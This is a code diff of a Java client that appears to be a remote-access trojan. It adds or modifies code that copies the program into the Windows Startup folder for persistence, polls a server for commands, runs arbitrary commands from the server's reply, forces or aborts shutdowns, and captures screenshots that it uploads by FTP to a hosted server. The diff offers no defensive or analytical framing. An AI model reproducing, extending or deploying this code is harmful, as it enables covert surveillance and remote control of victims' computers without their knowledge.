@@ -42,13 +42,10 @@ public class Client {
 
     static Timestamp timestamp = new Timestamp(System.currentTimeMillis());
 
-	//FTP SERVER LOGIN
-	//Screenshot will be uploaded to this ftp
-	
-    static String server = ""; //FTP Address
+    static String server = "files.000webhost.com";
     static int port = 21;
-    static String user = ""; //FTP ID
-    static String pass = ""; //FTP Password
+    static String user = "ftp username";
+    static String pass = "ftp password";
 
     static FTPClient ftpClient = new FTPClient();
 
@@ -71,11 +68,12 @@ public class Client {
         frame.pack();
         frame.setLocationRelativeTo(null);
 
-        Path p=Paths.get("ClientApp.jar"); //You can convert jar to exe using launch4J http://launch4j.sourceforge.net/
+        Path p=Paths.get("ClientApp.exe");
 
         String currentUsersHomeDir = System.getProperty("user.home");
         String otherFolder = currentUsersHomeDir + File.separator + "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-        Path d=Paths.get(otherFolder+ File.separator +"ClientApp.jar");
+        Path d=Paths.get(otherFolder+ File.separator +"ClientApp.exe");
+
        if(Files.exists(p)&!Files.exists(d)){
 
            System.out.print("Exist File");
@@ -187,6 +185,15 @@ public class Client {
                         e.printStackTrace();
                     }
                 }
+
+                if (out.contains("CancelShut")){
+                    try {
+                        exe(out.substring(out.lastIndexOf("execute")+7,out.indexOf("cmd50")));
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+
             }
         };
 
@@ -204,15 +211,15 @@ public class Client {
         static String repeat() {
 
 
-            URL link = null;
+            URL oracle = null;
             BufferedReader in=null;
             String inputLine="";
             String res="";
             try {
 
-                link = new URL("http://YOUR SERVER/index.php?time="+sdf.format(timestamp));  //sends current time
+                oracle = new URL("url="+sdf.format(timestamp));
                 in = new BufferedReader(
-                        new InputStreamReader(link.openStream()));
+                        new InputStreamReader(oracle.openStream()));
 
                 while ((inputLine = in.readLine()) != null){
 
@@ -232,6 +239,12 @@ static void ShutDown(String time) throws IOException{
 
     Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"shutdown /s /f /t "+time+ "&& exit\"");
 }
+
+    static void canc(String time) throws IOException{
+
+        Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"shutdown /a && exit\"");
+    }
+
 static void takeSS() throws Exception{
 
     String fileName="";
@@ -267,7 +280,7 @@ static void upl(String name) throws Exception{
     // APPROACH #1: uploads first file using an InputStream
     File firstLocalFile = new File(name);
 
-    String firstRemoteFile = "public_html/ss/"+name;  
+    String firstRemoteFile = "public_html/ss/"+name;
     InputStream inputStream = new FileInputStream(firstLocalFile);
 
     System.out.println("Start uploading first file");
